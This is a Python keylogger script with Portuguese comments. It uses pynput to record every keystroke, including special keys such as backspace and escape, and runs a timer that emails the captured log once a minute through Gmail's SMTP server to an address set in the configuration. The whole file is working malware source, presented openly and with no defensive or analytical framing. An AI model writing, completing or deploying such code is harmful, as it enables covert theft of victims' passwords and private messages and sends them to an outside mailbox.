from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Configuracao do e-mail
EMAIL_ORIGEM = "{ e-mail que irá encaminhar }"
EMAIL_DESTINO = "{ e-mail que irá receber }"
SENHA_EMAIL = "{ senha do e-mail }"

# Funcao que ira enviar e-mail
def enviar_email():
    global log

    # Monta e-mail
    if log: 
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
    
    try: 
        server = smtplib.SMTP("smtp.gmail.com", 587) # Definindo conexao com servidor(SMTP) para envio do e-mail
        server.starttls() # Envia e-mail
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
    
    except Exception as e: 
        print("Erro ao enviar", e)
    
    log = "" # Limpando log


    # Temporizador para envio do e-mail
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try: 
        log += key.char # Registrando teclas char
    # Definindo teclas especiais que serao registradas
    except AttributeError:
            if key == keyboard.Key.space:
                log +=" "
            elif key == keyboard.Key.enter:
                log +="\r"
            elif key == keyboard.Key.tab:
                log +="\r"
            elif key == keyboard.Key.caps_lock:
                log +="\t"
            elif key == keyboard.Key.backspace:
                log +="[BACKSPACE]"
            elif key == keyboard.Key.esc:
                log +="[ESC]"
            else:
                pass # Ignorar teclas sem caracteres

# Inicia o keylogger e envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()